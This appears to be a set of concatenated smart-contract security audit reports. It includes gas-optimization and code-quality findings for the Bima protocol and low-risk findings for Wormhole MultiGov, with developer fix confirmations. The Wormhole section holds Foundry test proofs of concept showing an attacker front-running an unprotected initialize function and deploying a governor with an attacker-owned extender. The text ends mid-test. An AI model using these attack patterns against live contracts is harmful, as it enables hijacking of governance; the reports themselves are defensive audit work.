250:        rewardRate[1] = SafeCast.toUint128(crvAmount / REWARD_DURATION);
253:        periodFinish = uint32(block.timestamp + REWARD_DURATION);

staking/Convex/ConvexDepositToken.sol
81:    uint256 constant REWARD_DURATION = 1 weeks;
313:        rewardRate[0] = SafeCast.toUint128(babelAmount / REWARD_DURATION);
314:        rewardRate[1] = SafeCast.toUint128(crvAmount / REWARD_DURATION);
315:        rewardRate[2] = SafeCast.toUint128(cvxAmount / REWARD_DURATION);
318:        periodFinish = uint32(block.timestamp + REWARD_DURATION);

```

**Bima:**
Fixed in commit [af23036](https://github.com/Bima-Labs/bima-v1-core/commit/af2303603e1a5ec53a414a15b54557c801b6153f).

**Cyfrin:** Verified.


### Use `ITroveManager::Status` enum types instead of casting to `uint256`

**Description:** Use `ITroveManager::Status` enum types instead of casting to `uint256`:
```diff
core/TroveManager.sol
- 364:    function getTroveStatus(address _borrower) external view returns (uint256 status) {
+ 364:    function getTroveStatus(address _borrower) external view returns (Status status) {

core/LiquidationManager.sol
- 130:        require(troveManager.getTroveStatus(borrower) == 1, "TroveManager: Trove does not exist or is closed");
+ 130:        require(troveManager.getTroveStatus(borrower) == ITroveManager.Status.active,
                "TroveManager: Trove does not exist or is closed");

core/helpers/TroveManagerGetters.sol
- 70:           if (ITroveManager(troveManager).getTroveStatus(account) > 0) {
+ 70:           if (ITroveManager(troveManager).getTroveStatus(account) != ITroveManager.Status.nonExistent) {

interfaces/ITroveManager.sol
- 228:    function getTroveStatus(address _borrower) external view returns (uint256);
+ 228:    function getTroveStatus(address _borrower) external view returns (Status);
```

**Bima:**
Fixed in commit [1ab7ebf](https://github.com/Bima-Labs/bima-v1-core/commit/1ab7ebffbd1653e39230bf0b24f1996fbf89c117).

**Cyfrin:** Verified.


### `StorkOracleWrapper` assumes all price feeds return 18 decimal prices

**Description:** `StorkOracleWrapper` assumes all price feeds return 18 decimal prices and hard-codes dividing by 1e10 to return values in 8 decimals.

Stork's documentation does not have publicly available information on what decimal precision their price feeds return; Bima should be careful to verify that every price feed which it uses with `StorkOracleWrapper` does indeed return a native 18 decimal value.

**Bima:**
Acknowledged - yes all prices from Stork Oracle are in 18 decimals.

\clearpage
## Gas Optimization


### Don't initialize to default values

**Description:** Don't initialize to default values:
```solidity
staking/Curve/CurveDepositToken.sol
152:        for (uint256 i = 0; i < 2; i++) {
203:        for (uint256 i = 0; i < 2; i++) {

core/StabilityPool.sol
155:        for (uint256 i = 0; i < length; i++) {
527:        for (uint256 i = 0; i < collateralGains.length; i++) {
554:        for (uint256 i = 0; i < collaterals; i++) {
729:            for (uint256 i = 0; i < length; i++) {
750:        for (uint256 i = 0; i < length; i++) {

staking/Curve/CurveProxy.sol
127:        for (uint256 i = 0; i < selectors.length; i++) {
222:        for (uint256 i = 0; i < votes.length; i++) {
286:        for (uint256 i = 0; i < balances.length; i++) {

core/TroveManager.sol
970:            for (uint256 i = 0; i < 7; i++) {

staking/Convex/ConvexDepositToken.sol
202:        for (uint256 i = 0; i < 3; i++) {
253:        for (uint256 i = 0; i < 3; i++) {

dao/InterimAdmin.sol
104:        for (uint256 i = 0; i < payload.length; i++) {
144:        for (uint256 i = 0; i < payloadLength; i++) {

core/helpers/TroveManagerGetters.sol
29:        for (uint i = 0; i < length; i++) {
43:        for (uint i = 0; i < collateralCount; i++) {
69:        for (uint i = 0; i < length; i++) {

dao/IncentiveVoting.sol
100:        for (uint256 i = 0; i < length; i++) {
444:            for (uint256 i = 0; i < length; i++) {
471:        for (uint256 i = 0; i < length; i++) {
522:        for (uint256 i = 0; i < votes.length; i++) {
544:        for (uint256 i = 0; i < lockLength; i++) {
557:        for (uint256 i = 0; i < length; i++) {
580:        for (uint256 i = 0; i < votes.length; i++) {
601:        for (uint256 i = 0; i < lockLength; i++) {
615:        for (uint256 i = 0; i < length; i++) {

dao/AdminVoting.sol
189:        for (uint256 i = 0; i < payload.length; i++) {
273:        for (uint256 i = 0; i < payloadLength; i++) {

dao/EmissionSchedule.sol
132:            for (uint256 i = 0; i < length; i++) {

dao/TokenLocker.sol
258:            for (uint256 i = 0; x != 0; i++) {
558:        for (uint256 i = 0; i < length; i++) {
623:        for (uint256 i = 0; i < length; i++) {

dao/Vault.sol
139:        for (uint256 i = 0; i < length; i++) {
147:        for (uint256 i = 0; i < length; i++) {
174:        for (uint256 i = 0; i < count; i++) {
359:        for (uint256 i = 0; i < length; i++) {

core/StabilityPool.sol
523:         hasGains = false;

core/helpers/MultiTroveGetter.sol
35:             descend = false;
```

**Bima:**
Fixed in commit [3639347](https://github.com/Bima-Labs/bima-v1-core/commit/3639347f7d7808f1ca1e37d90b398bb1b68bfd34).

**Cyfrin:** Verified.


### Remove redundant `token` parameter from `DebtToken::maxFlashLoan`, `flashFee`, `flashLoan`

**Description:** Remove redundant `token` parameter from `DebtToken::maxFlashLoan`, `flashFee`, `flashLoan` - this parameter is useless since `DebtToken` only provides flash loans using its own tokens.

**Bima:**
Fixed in commit [bab12ba](https://github.com/Bima-Labs/bima-v1-core/commit/bab12ba5a9252d2a85b05f42100731176bd71c15).

**Cyfrin:** Verified.


###  Cache storage variables when same values read multiple times

**Description:** Cache storage variables when same values read multiple times:

File: `dao/AirdropDistributor.sol`
```solidity
// function `setMerkleRoot`
// should cache `block.timestamp + CLAIM_DURATION` into memory,
// write that to `canClaimUntil` storage then read cached copy when
// emitting event
55:        canClaimUntil = block.timestamp + CLAIM_DURATION;
56:        emit MerkleRootSet(_merkleRoot, canClaimUntil);

// function `claim`
// cache `merkleRoot` saving 1 storage read
98:        require(merkleRoot != bytes32(0), "merkleRoot not set");
103:        require(MerkleProof.verifyCalldata(merkleProof, merkleRoot, node), "Invalid proof");
```

File: `dao/AllocationVesting.sol`
```solidity
// function `_vestedAt`
// cache `vestingStart` saving 2 storage reads
230:        if (vestingStart == 0 || numberOfWeeks == 0) return 0;
232:        uint256 vestingEnd = vestingStart + vestingWeeks;
234:        uint256 timeSinceStart = endTime - vestingStart;
```

File: `dao/Vault.sol`
```solidity
// function setInitialParameters
// cache unallocated calculation then use it to set unallocatedTotal
// and emit the event, saving 1 storage read
156:        unallocatedTotal = uint128(totalSupply - totalAllocated);
162:        emit UnallocatedSupplyReduced(totalAllocated, unallocatedTotal);
```

File: `core/StabilityPool.sol`
```solidity
// function startCollateralSunset
// cache indexByCollateral[collateral] to save 1 storage read
211:        require(indexByCollateral[collateral] > 0, "Collateral already sunsetting");
213:            uint128(indexByCollateral[collateral] - 1),
```

**Bima:**
Fixed in commits [6be47c8](https://github.com/Bima-Labs/bima-v1-core/commit/6be47c806dea53901f0c39d42948aa80321486b2), [2166534](https://github.com/Bima-Labs/bima-v1-core/commit/2166534ed4d1071767e75322c4ad1c99ba8e9c27), [2ecc532](https://github.com/Bima-Labs/bima-v1-core/commit/2ecc5323b8fecab7f00ab185eb34afec9c654331)

**Cyfrin:** Verified.


### Prefer assignment to named return variables and remove explicit return statements

**Description:** [Prefer](https://x.com/DevDacian/status/1796396988659093968) assignment to named return variables and remove explicit return statements.

**Bima:**
Fixed in commit [82ef243](https://github.com/Bima-Labs/bima-v1-core/commit/82ef243b0dbe3e85bc53a7a9578faad8256f9a71), [2166534](https://github.com/Bima-Labs/bima-v1-core/commit/2166534ed4d1071767e75322c4ad1c99ba8e9c27), [3207c59](https://github.com/Bima-Labs/bima-v1-core/commit/3207c599871c2a55dd30acd45b8989d2ff4e1049), [ab8df52](https://github.com/Bima-Labs/bima-v1-core/commit/ab8df520fc2472e8654dd5a2cfb0c2c572ddcd0e), [1b12aa5](https://github.com/Bima-Labs/bima-v1-core/commit/1b12aa5b4a5e4f68f08da2dbe1994dfa8ed4a6af), [456df42](https://github.com/Bima-Labs/bima-v1-core/commit/456df420862d80f7b70b3513381320c281e02dd0), [1d469e1](https://github.com/Bima-Labs/bima-v1-core/commit/1d469e16b2d23cf7710fc1ee5edff9f4e7aa960d), [4d70707](https://github.com/Bima-Labs/bima-v1-core/commit/4d707077a247ce90c81bda072db42d2f145005fb), [f7e6487](https://github.com/Bima-Labs/bima-v1-core/commit/f7e64879bad30bbd13151aa6b85f7c72cd97674a), [a150695](https://github.com/Bima-Labs/bima-v1-core/commit/a15069514f86a219449d4a4e48a68da6e0ecd149), [91a7df5](https://github.com/Bima-Labs/bima-v1-core/commit/91a7df598b42a04e28c6ed42d8630fc74c2b7c1f), [80976c4](https://github.com/Bima-Labs/bima-v1-core/commit/80976c45c7317472d096ed10efd1029cc2daee7e), [709839c](https://github.com/Bima-Labs/bima-v1-core/commit/709839c74c93b66e56183c433ff89d2dfa0342bd).

**Cyfrin:** Verified.


### Refactor `AdminVoting::minCreateProposalWeight` to eliminate unnecessary variables and multiple calls to `getWeek`

**Description:** Refactor `AdminVoting::minCreateProposalWeight` to eliminate unnecessary variables and multiple calls to `getWeek`:
```solidity
function minCreateProposalWeight() public view returns (uint256 weight) {
    // store getWeek() directly into output `weight` return
    weight = getWeek();

    // if week == 0 nothing else to do since weight also 0
    if(weight != 0) {
        // otherwise over-write output with weight calculation subtracting
        // 1 from the week
        weight = _minCreateProposalWeight(weight-1);
    }
}

// create a new private function called by the public variant and also by `createNewProposal`
function _minCreateProposalWeight(uint256 week) internal view returns (uint256 weight) {
    // store total weight directly into output `weight` return
    weight = tokenLocker.getTotalWeightAt(week);

    // prevent proposal creation if zero total weight for given week
    require(weight > 0, "Zero total voting weight for given week");

    // over-write output return with weight calculation
    weight = (weight * minCreateProposalPct / MAX_PCT);
}

// then change `createNewProposal` to call the new private function passing in the week input
require(accountWeight >= _minCreateProposalWeight(week), "Not enough weight to propose");
```

**Bima:**
Fixed in commit [51200dc](https://github.com/Bima-Labs/bima-v1-core/commit/51200dc63f0ceaf298cc692ce80beab9ce7c0073).

**Cyfrin:** Verified.


### Remove duplicate calculation in `TokenLocker::withdrawWithPenalty`

**Description:** Remove duplicate [calculation](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/dao/TokenLocker.sol#L878-L879) in `TokenLocker::withdrawWithPenalty`:
```diff
- accountData.locked -= uint32((amountToWithdraw + penaltyTotal - unlocked) / lockToTokenRatio);
- totalDecayRate -= uint32((amountToWithdraw + penaltyTotal - unlocked) / lockToTokenRatio);
+ // calculate & cache total amount of locked tokens withdraw inc penalties,
+ // scaled down by lockToTokenRatio
+ uint32 lockedPlusPenalties = SafeCast.toUint32((amountToWithdraw + penaltyTotal - unlocked) / lockToTokenRatio);

+ // update account locked and global totalDecayRate subtracting
+ // locked tokens withdrawn including penalties paid
+ accountData.locked -= lockedPlusPenalties;
+ totalDecayRate -= lockedPlusPenalties;
```

To get around "stack too deep" remove this [line](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/dao/TokenLocker.sol#L803C9-L803C74):
```diff
- uint32[65535] storage unlocks = accountWeeklyUnlocks[msg.sender];
```

And simply reference the storage location directly where it is needed, eg:
```diff
- uint256 lockAmount = unlocks[systemWeek] * lockToTokenRatio;
+ uint256 lockAmount = accountWeeklyUnlocks[msg.sender][systemWeek] * lockToTokenRatio;
```

**Bima:**
Fixed in commit [b8d648a](https://github.com/Bima-Labs/bima-v1-core/commit/b8d648a83ebf3747ff41d0aa20172e65adcb0d5a).

**Cyfrin:** Verified.


### Re-order `TokenLocker::penaltyWithdrawalsEnabled` to save 1 storage slot

**Description:** `TokenLocker::penaltyWithdrawalsEnabled` can be put after `totalUpdatedWeek` such that `totalDecayRate`, `totalUpdatedWeek` and `penaltyWithdrawalsEnabled` can be packed into the same storage slot:
```solidity
// Rate at which the total lock weight decreases each week. The total decay rate may not
// be equal to the total number of locked tokens, as it does not include frozen accounts.
uint32 public totalDecayRate;
// Current week within `totalWeeklyWeights` and `totalWeeklyUnlocks`. When up-to-date
// this value is always equal to `getWeek()`
uint16 public totalUpdatedWeek;

bool public penaltyWithdrawalsEnabled;
uint256 public allowPenaltyWithdrawAfter;
```

**Bima:**
Fixed in commit [08d825a](https://github.com/Bima-Labs/bima-v1-core/commit/08d825a30985d98a441deeeb41e7638e5b1e86a4).

**Cyfrin:** Verified.


### More efficient and simpler implementation of `BabelVault::setReceiverIsActive`

**Description:** `BabelVault::setReceiverIsActive` doesn't need to cache `idToReceiver[id]` into memory since it only reads the `account` field so there is no reason to read every field from storage.

Also it only updates the `isActive` field so there is no reason to update all the fields by writing the memory copy back to storage. A more efficient and simpler implementation is:
```solidity
function setReceiverIsActive(uint256 id, bool isActive) external onlyOwner returns (bool success) {
    // revert if receiver id not associated with an address
    require(idToReceiver[id].account != address(0), "ID not set");

    // update storage - isActive status, address remains the same
    idToReceiver[id].isActive = isActive;

    emit ReceiverIsActiveStatusModified(id, isActive);

    success = true;
}
```

**Bima:**
Fixed in commit [1b12aa5](https://github.com/Bima-Labs/bima-v1-core/commit/1b12aa5b4a5e4f68f08da2dbe1994dfa8ed4a6af).

**Cyfrin:** Verified.


### Remove `BabelVault::receiverUpdatedWeek` and add `updatedWeek` member to struct `Receiver`

**Description:** The mapping `idToReceiver` already links the receiver id to the receiver's data:
```solidity
mapping(uint256 receiverId => Receiver receiverData) public idToReceiver;
```

Hence it is simpler & cleaner to remove `BabelVault::receiverUpdatedWeek` and add an `updatedWeek` member to struct `Receiver`:
```diff
-   // id -> receiver data
-   uint16[65535] public receiverUpdatedWeek;

    struct Receiver {
        address account;
        bool isActive;
+       uint16 updatedWeek;
    }
```

**Bima:**
Fixed in commit [d93c2ba](https://github.com/Bima-Labs/bima-v1-core/commit/d93c2bae8ca8971af78b3850b3d3935e6fb56609).

**Cyfrin:** Verified.


### Don't cache `calldata` array length

**Description:** When looping through an array passed as `calldata`, it is more [efficient](https://x.com/DevDacian/status/1791490921881903468) to not cache the array length.

**Bima:**
Fixed in commits [4b3ae20](https://github.com/Bima-Labs/bima-v1-core/commit/4b3ae202b99aa232d70858b35e36d2f491557137), [a2232a2](https://github.com/Bima-Labs/bima-v1-core/commit/a2232a2b0dd98e58b2527aa49451ad9d4da4ed7f), [d9998da](https://github.com/Bima-Labs/bima-v1-core/commit/d9998da6e0df31312f960d8d3301f0c39cbdbdf6#diff-20302eb9e2117cabe15d042053d9902a4ebfb2f690d37e85f6127f4f427ad8b6L238-R248)

**Cyfrin:** Verified.


### Use `calldata` instead of `memory` for inputs to `external` functions

**Description:** Use `calldata` instead of `memory` for inputs to `external` functions.

**Bima:**
Fixed in commits [7cd87aa](https://github.com/Bima-Labs/bima-v1-core/commit/7cd87aa0a8d4f908d8c2f5e3cae215d2740b8dd0), [22119e1](https://github.com/Bima-Labs/bima-v1-core/commit/22119e1ecee81818ca535b783fa9d1b1a32a66c0), [2ecc532](https://github.com/Bima-Labs/bima-v1-core/commit/2ecc5323b8fecab7f00ab185eb34afec9c654331)

**Cyfrin:** Verified.


### Save 2 storage reads in `StabilityPool::enableCollateral`

**Description:** Save 2 storage reads in `StabilityPool::enableCollateral` by:

1) Reading from `queueCached.firstSunsetIndexKey` then writing after:
```diff
- delete _sunsetIndexes[queue.firstSunsetIndexKey++];
+ delete _sunsetIndexes[queueCached.firstSunsetIndexKey];
+ ++queue.firstSunsetIndexKey;
```

2) Using `length + 1` instead of `collateralTokens.length`:
```diff
  collateralTokens.push(_collateral);
- indexByCollateral[_collateral] = collateralTokens.length;
+ indexByCollateral[_collateral] = length + 1;
```

**Bima:**
Fixed in commit [7eef5f9](https://github.com/Bima-Labs/bima-v1-core/commit/7eef5f9e683880ded3bfb60feaecbdc1b2a21884).

**Cyfrin:** Verified.


### Save two storage slots by better storage packing in `TroveManager`

**Description:** Save two storage slots by better storage packing in `TroveManager` - relocate these 3 declarations under `periodFinish`:
```solidity
uint256 public rewardIntegral;
uint128 public rewardRate;
uint32 public lastUpdate;
uint32 public periodFinish;

// here for storage packing
bool public sunsetting;
bool public paused;
EmissionId public emissionId;
```

Ideally `TroveManager` storage would also be refactored to group all declarations together in common sections.

**Bima:**
Fixed in commit [305c007](https://github.com/Bima-Labs/bima-v1-core/commit/305c0076552dcb2477b9f9135528b46279446abe).

**Cyfrin:** Verified.


### Optimize away `currentActiveDebt` and `activeInterests` variables from `TroveManager::getEntireSystemDebt`

**Description:** `TroveManager::getEntireSystemDebt` can optimize away the `currentActiveDebt` and `activeInterests` variable by reading `totalActiveDebt` straight into the named output variable then using that, eg:
```solidity
function getEntireSystemDebt() public view returns (uint256 debt) {
    debt = totalActiveDebt;

    (, uint256 interestFactor) = _calculateInterestIndex();

    if (interestFactor > 0) {
        debt += Math.mulDiv(debt, interestFactor, INTEREST_PRECISION);
    }

    debt += defaultedDebt;
}
```

The same optimization can be applied to `TroveManager::getTotalActiveDebt`.

**Bima:**
Fixed in commits [e7b13a6](https://github.com/Bima-Labs/bima-v1-core/commit/e7b13a6517bcb624753f6c9a0d01ae04bafd0fff) and [2ebd7d8](https://github.com/Bima-Labs/bima-v1-core/commit/2ebd7d8d1c593d4648ffe25d56da2f750b4e7ee0).

**Cyfrin:** Verified.


### Delete `TroveManager::_removeStake` and perform this as part of `_closeTrove` since they always occur together

**Description:** `TroveManager::_removeStake`  is only ever called immediately before `_closeTrove` so the function can be deleted and its functionality implemented more efficiently inside `_closeTrove` like this:
```solidity
function _closeTrove(address _borrower, Status closedStatus) internal {
    uint256 TroveOwnersArrayLength = TroveOwners.length;

    // update storage - borrower Trove state
    Trove storage t = Troves[_borrower];
    t.status = closedStatus;
    t.coll = 0;
    t.debt = 0;
    t.activeInterestIndex = 0;
    // _removeStake functionality
    totalStakes -= t.stake;
    t.stake = 0;
    // ...
```

This also ensures that a coding mistake couldn't be made in the future where `_closeTrove` would be called while forgetting to first call `_removeStake`.

**Bima:**
Fixed in commit [6c832fc](https://github.com/Bima-Labs/bima-v1-core/commit/6c832fc031b7686a5bdab4ae1b48908c774f0268).

**Cyfrin:** Verified.

\clearpage

------ FILE END car/reports_md/2024-09-27-cyfrin-bima-v2.0.md ------


------ FILE START car/reports_md/2024-10-04-cyfrin-wormhole-multigov-v2.0.md ------

**Lead Auditors**

[0kage](https://twitter.com/0kage_eth)

[Hans](https://twitter.com/hansfriese)

**Assisting Auditors**



---

# Findings
## Low Risk


### Lack of access control in `HubProposalExtender::initialize`

**Description:** `HubProposalExtender::initialize` can only be called once. Lack of access control in this function would mean that an attacker can front-run this function to set a a malicious Governor. This can prevent the extender admin from extending duration for any proposal

**Impact:** Front-running initialize can potentially prevent extension of proposals

**Proof of Concept:** Run the following fuzz test:

```solidity
  function testFuzz_FrontRun_HubProposalExtender_Initialize(address attacker, address maliciousGovernor) public {
    vm.assume(attacker != address(0) && attacker != address(this) && attacker != address(timelock));
    vm.assume(maliciousGovernor != address(0) && maliciousGovernor != address(governor));

    // Create a new HubProposalExtender
    HubProposalExtenderHarness newExtender = new HubProposalExtenderHarness(
        whitelistedExtender,
        extensionDuration,
        address(timelock),
        minimumTime,
        voteWeightWindow,
        minimumTime
    );

    // Attacker front-runs the initialization
    vm.prank(attacker);
    newExtender.initialize(payable(maliciousGovernor));

    // Assert that the malicious governor was set
    assertEq(address(newExtender.governor()), maliciousGovernor);

    // Attempt to initialize again with the intended governor (this should fail)
    vm.prank(address(timelock));
    vm.expectRevert(HubProposalExtender.AlreadyInitialized.selector);
    newExtender.initialize(payable(address(governor)));

    // Assert that the governor is still the malicious one
    assertEq(address(newExtender.governor()), maliciousGovernor);
}
```

**Recommended Mitigation:** Consider restricting access to `initialize` function only to the contract owner.

**Wormhole Foundation**
Fixed in [PR 177](https://github.com/wormhole-foundation/example-multigov/pull/177/commits/7c74ecea48fe3379d1b8a5c7b2374aa3adeb997e).

**Cyfrin:** Verified.


### Lack of zero address checks at multiple places

**Description:** In general, codebase lacks input validations such as zero address checks.

`HubVotePool::constructor`

```solidity
  constructor(address _core, address _hubGovernor, address _owner) QueryResponse(_core) Ownable(_owner) { //@note initialized query response with womrhole core
    hubGovernor = IGovernor(_hubGovernor);
    HubEvmSpokeVoteDecoder evmDecoder = new HubEvmSpokeVoteDecoder(_core, address(this));
    _registerQueryType(address(evmDecoder), QueryResponse.QT_ETH_CALL_WITH_FINALITY);
  }
```

`HubVotePool::registerSpoke`
```solidity
  function registerSpoke(uint16 _targetChain, bytes32 _spokeVoteAddress) external {
    _checkOwner();
    _registerSpoke(_targetChain, _spokeVoteAddress);
  }
```

`HubPool::setGovernor`
```solidity
 function setGovernor(address _newGovernor) external {
    _checkOwner();
    hubGovernor = IGovernor(_newGovernor);
}
```

`HubProposalExtender::setVoteExtenderAdmin`
```solidity
 function setVoteExtenderAdmin(address _voteExtenderAdmin) external {
    _checkOwner();
    _setVoteExtenderAdmin(_voteExtenderAdmin); //@audit @info missing zero address check
  }
```

**Recommended Mitigation:** Consider adding zero address checks where applicable.

**Wormhole Foundation**
Acknowledged.

**Cyfrin:** Acknowledged.


### Lack of limits of vote weight window can lead to unfair voting power estimation

**Description:** There are no checks on the vote weight window duration in the `HubGovernor::setVoteWeightWindow`. Although it is a governance only function, setting very small or extremely large vote weight duration could lead to unfair voting power estimation.

```solidity
  function setVoteWeightWindow(uint48 _weightWindow) external {
    _checkGovernance();
    _setVoteWeightWindow(_weightWindow);
  }
```

```solidity
  function _setVoteWeightWindow(uint48 _windowLength) internal { //@audit no check on windowLength
    emit VoteWeightWindowUpdated(
      SafeCast.toUint48(voteWeightWindowLengths.upperLookup(SafeCast.toUint48(block.timestamp))), _windowLength
    );
    voteWeightWindowLengths.push(SafeCast.toUint96(block.timestamp), uint160(_windowLength));
  }
```
**Impact:** Extremely small vote weight period can attract token manipulation from users and extremely large voting period will penalize recent holders.

**Recommended Mitigation:** Consider adding reasonable MINIMUM and MAXIMUM limits on the vote weight period instead of completely leaving it to governance.

**Wormhole Foundation**
Acknowledged.

**Cyfrin:** Acknowledged.


### `HubGovernor` lacks validation on `HubProposalExtender` ownership

**Description:** The `HubGovernor` contract accepts a `HubProposalExtender` address as an immutable parameter in its constructor. However, it does not verify that this extender is owned by the `timelock` contract.

This oversight allows for the deployment of a HubGovernor instance with a HubProposalExtender that is not controlled by the governance system, potentially bypassing critical governance controls.

The deployment script in `DeployHubContractsBaseImpl.s.sol` deploy the extender with the owner as `config.voteExtenderAdmin` address and not the timelock address.

`DeployHubContractsBaseImpl.s.sol`
```solidity
 function run()
    public
    returns (
      TimelockController,
      HubVotePool,
      HubGovernor,
      HubProposalMetadata,
      HubMessageDispatcher,
      HubProposalExtender
    )
  {
    DeploymentConfiguration memory config = _getDeploymentConfiguration();
    Vm.Wallet memory wallet = _deploymentWallet();
    vm.startBroadcast(wallet.privateKey);
    TimelockController timelock =
      new TimelockController(config.minDelay, new address[](0), new address[](0), wallet.addr);

    HubProposalExtender extender = new HubProposalExtender(
      config.voteExtenderAdmin, config.voteTimeExtension, config.voteExtenderAdmin, config.minimumExtensionTime
    );

   // other code
}
```

However, all tests written in `HubProposalExtender.t.sol` use the `timelock` address as the contract owner.

**Impact:** Changes to critical parameters such as extension duration or the vote extender admin could be made without going through the proper governance process.

**Proof of Concept:** Add the following to `HubGovernor.t.sol`

```solidity
contract ExtenderOwnerNotTimelockTest is HubGovernorTest {
    address attacker = address(200);
    HubProposalExtender maliciousExtender;

    function testExtenderOwnerNotTimelock() public {
        // Attacker deploys their own HubProposalExtender
        vm.prank(attacker);
        maliciousExtender = new HubProposalExtender(
            attacker, // voteExtenderAdmin
            1 hours,  // extensionDuration
            attacker, // owner
            30 minutes // MINIMUM_EXTENSION_DURATION
        );

        // Deploy HubGovernor with the malicious extender
        HubGovernor.ConstructorParams memory params = HubGovernor.ConstructorParams({
            name: "Vulnerable Gov",
            token: token,
            timelock: timelock,
            initialVotingDelay: 1 days,
            initialVotingPeriod: 3 days,
            initialProposalThreshold: 500_000e18,
            initialQuorum: 100e18,
            hubVotePoolOwner: address(timelock),
            wormholeCore: address(wormhole),
            governorProposalExtender: address(maliciousExtender),
            initialVoteWeightWindow: VOTE_WEIGHT_WINDOW
        });

        HubGovernor vulnerableGovernor = new HubGovernor(params);

        // Verify that the deployment succeeded and the malicious extender is set
        assertEq(address(vulnerableGovernor.HUB_PROPOSAL_EXTENDER()), address(maliciousExtender));

        // Verify that the attacker owns the extender, not the timelock
        assertEq(Ownable(address(maliciousExtender)).owner(), attacker);
        assertTrue(Ownable(address(maliciousExtender)).owner() != address(timelock));

       // initialize
       maliciousExtender.initialize(payable(vulnerableGovernor));

        // Attacker can change extension duration without governance
        vm.prank(attacker);
        maliciousExtender.setExtensionDuration(2 days);

        // The change is reflected in the extender used by the governor
        assertEq(HubProposalExtender(address(vulnerableGovernor.HUB_PROPOSAL_EXTENDER())).extensionDuration(), 2 days);
    }
}
```

**Recommended Mitigation:** Consider adding a check in the `HubGovernor` constructor to ensure the `HubProposalExtender` is owned by the `timelock`. Alternately, consider transferring ownership of the `HubProposalExtender` to the `timelock` contract in the deployment scripts.

`HubGovernor.sol`
```solidity
constructor(ConstructorParams memory _params) {
    // ... existing constructor logic ...

    if (Ownable(_params.governorProposalExtender).owner() != address(_params.timelock)) {
        revert ProposalExtenderNotOwnedByTimelock();
    } //@audit add this validation

    HUB_PROPOSAL_EXTENDER = IVoteExtender(_params.governorProposalExtender);

    // ... rest of the constructor ...
}
```

**Wormhole Foundation**
Fixed in [PR 179](https://github.com/wormhole-foundation/example-multigov/pull/179/commits/00f8a96a86c8f7009e9ac281ba62545869a30f40#diff-79d0f3e579465b402696db82e7e860247f827d7ebd5519584f50937cad11879f).

**Cyfrin:** Verified.


### Contract accounts and account abstraction wallets face limitations in Cross-Chain proposal creation and voting power utilization

**Description:** Multichain governance system allows users to aggregate all their voting power that is distributed across all chains connected to the system (including the hub chain) to gather enough voting power to create a new proposal.

However, contract accounts & AA wallets holding tokens on spoke chains cannot use their voting power to create a proposal on the hub chain. Such accounts may not control the same address across all the chains where they have tokens, which means that they would not be able to use their voting power on the HubChain, unless they either transfer the tokens or delegate the votes to a trusted Externally Operated Account (EOA).

`HubEvmSpokeAggregateProposer::checkAndProposeIfEligible` checks that the caller (msg.sender) is same as the queriedAccount and reverts otherwise.

```solidity
 function _checkProposalEligibility(bytes memory _queryResponseRaw, IWormhole.Signature[] memory _signatures)
    internal
    view
    returns (bool)
  {
       // code

        for (uint256 i = 0; i < _queryResponse.responses.length; i++) {
            // code...

           // Check that the address being queried is the caller
           if (_queriedAccount != msg.sender) revert InvalidCaller(msg.sender, _queriedAccount);

          // code...
       }

  }
```

These accounts need to delegate their votes much before the proposal creation date for the vote weight to be considered - transferring just prior to proposal creation would lead to a temporary loss of voting power. This is because voting power is calculated as the minimum token holding over the vote weight window.

This constraint of delegating voting power long before a proposal is created introduces an associated risk, ie. delegated voting power of contracts can be misused for voting on other unrelated proposals. It increases overall trust assumptions in a decentralized voting system.

**Impact:** There are two risks:
1. Recently delegated voting power will be temporarily lost because of voting window constraints
2. Voting power delegated well before proposal creation can be misused to cast vote on other active proposals.

**Recommended Mitigation:** Consider implementing a mechanism that allows contract accounts to prove ownership across chains without requiring the same address.

Alternatively, consider documenting the constraints and risks of delegation for contract accounts and account abstraction wallets in the existing design. This would help the relevant parties plan in advance if, how & when to delegate their voting power to an EOA in the event of proposal creation.

**Wormhole Foundation**
Fixed in [PR 178](https://github.com/wormhole-foundation/example-multigov/pull/178/commits/914aec3776273a5dd17a036af16c1fb981cea26b)

**Cyfrin:** Verified.



### Cross-Chain votes can be invalidated in some scenarios due to Hub-Spoke timestamp mismatch

**Description:** Current implementation of the cross-chain voting mechanism in the `HubVotePool` contract does not account for the timestamp of votes cast on spoke chains. When the `HubVotePool::crossChainVote` function is called, it uses the current timestamp to determine vote validity, rather than the timestamp when the votes were actually cast on the spoke chains.

This leads to a situation where valid votes from spoke chains can be rejected if they are processed by the hub after the voting period has ended, even if they were cast within the valid voting timeframe.

The issue stems from the use of OpenZeppelin's Governor contract, which checks the proposal's state based on the current block timestamp when castVote is called. In a cross-chain context, this doesn't account for the latency between vote casting on spoke chains and vote processing on the hub chain.


```solidity
// In HubVotePool's crossChainVote function (simplified)
function crossChainVote(bytes memory _queryResponseRaw, IWormhole.Signature[] memory _signatures) external {
    // ... (parsing and verification)

    // This call uses the current timestamp, not the spoke chain's timestamp
    hubGovernor.castVoteWithReasonAndParams(
        _proposalId,
        UNUSED_SUPPORT_PARAM,
        "rolled-up vote from governance spoke token holders",
        _votes
    );
}

// In OpenZeppelin's Governor contract
function _castVote(
    uint256 proposalId,
    address account,
    uint8 support,
    string memory reason,
    bytes memory params
) internal virtual returns (uint256) {
    // This check uses the current timestamp
    _validateStateBitmap(proposalId, _encodeStateBitmap(ProposalState.Active));
    // ...
}
```

**Impact:** Valid votes from spoke chains may be discarded if processed after the voting period. The final vote tally may not accurately represent all valid votes cast across the network.

It is worthwhile to note that this risk exists only for spoke chains. While voters on the hub chain can vote upto the last minute with a guarantee that their votes will be valid, such guarantee does not exist for the spoke chain voters. Also, time to finality for most L2's is ~15 minutes and hence this edge-case will exist in the current design irrespective of the crank-turner's efficiency.

We also note that the `HubProposalExtender` has the ability to do a one-time extension of voting period to account for edge-cases related to chain-outages and scenarios where votes could not be propagated back onto the hub chain. While this definitely mitigates the risk significantly, it does not completely remove the risk of vote loss.

**Proof of Concept:** Add the following to `HubGovernor.t.sol`

```solidity
contract CountHubPoolVote is HubGovernorTest {
  function test_Revert_HubPoolValidVotesRejected() external {
    uint256 proposalId = 0;
    uint16 queryChainId = 2;
    address _spokeContract= address(999);

   // set current hub vote pool
   governor.exposed_setHubVotePool(address(hubVotePool));

   // and register spoke contract
    {
      vm.startPrank(address(timelock));
        hubVotePool.registerSpoke(queryChainId, addressToBytes32(_spokeContract));
      vm.stopPrank();
    }

    {
      (, delegates) = _setGovernorAndDelegates();
